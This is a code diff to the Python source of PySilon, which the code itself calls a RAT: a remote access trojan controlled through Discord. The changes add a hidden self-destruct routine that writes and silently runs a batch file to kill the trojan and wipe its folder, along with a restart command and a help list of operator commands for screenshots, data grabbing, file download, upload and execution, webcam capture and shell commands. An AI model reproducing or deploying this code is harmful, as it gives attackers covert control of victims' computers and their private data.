@@ -21,6 +21,8 @@
 from urllib.request import urlopen
 from itertools import islice
 from resources.misc import *
+from getpass import getuser
+from shutil import rmtree
 import subprocess
 import discord
 import asyncio
@@ -71,9 +73,10 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-working_directory = sys.argv[0].split('\\')[:-1]
 
 # [pysilon_var] !registry 0
+
+working_directory = ['C:', 'Users', getuser(), software_directory_name]
 
 @client.event
 async def on_ready():
@@ -127,6 +130,8 @@ async def on_ready():
             else:
                 chunk += line + '\n'
         await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+
+
     else:
         for channel in category.channels:
             if channel.name == 'info': channel_ids['info'] = channel.id
@@ -166,7 +171,7 @@ async def on_raw_reaction_add(payload):
     message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
     reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
     user = payload.member
-    
+  
     if user.bot == False:
         if str(reaction) == '📌':
             if message.channel.id in channel_ids.values():
@@ -183,13 +188,19 @@ async def on_reaction_add(reaction, user):
         if reaction.message.channel.id in channel_ids.values():
             try:
                 if str(reaction) == '💀' and expectation == 'implosion':
+                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successfull.```')
 # [pysilon_var] !registry_implosion 5
                     secure_delete_file('PySilon.key', 10)
-                    os.system('cmd.exe /c taskkill /f /pid ' + str(os.getpid()) + ' & del "' + sys.argv[0] + '"')
+                    try: rmtree('rec_')
+                    except: pass
+                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
+                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
+                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
+                    sys.exit(0)
                 elif str(reaction) == '🔴' and expectation == 'implosion':
-                    expectation = None                
+                    expectation = None
 # [pysilon_var] on reaction add 4
-            except Exception as err: print(err)
+            except Exception as err: await reaction.message.channel.send(str(err))
 
 @client.event
 async def on_raw_reaction_remove(payload):
@@ -209,7 +220,18 @@ async def on_message(message):
                 await message.delete()
                 await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                 expectation = 'key'
-
+            
+            elif message.content == '.restart':
+                await message.delete()
+                await message.channel.send('```PySilon will be restarted now... Stand by...```')
+                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
+                sys.exit(0)
+                
+            elif message.content[:5] == '.help':
+                await message.delete()
+                if message.content.strip() == '.help':
+                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
+            
             elif expectation == 'key':
                 try:
                     split_v1 = str(message.attachments).split("filename='")[1]
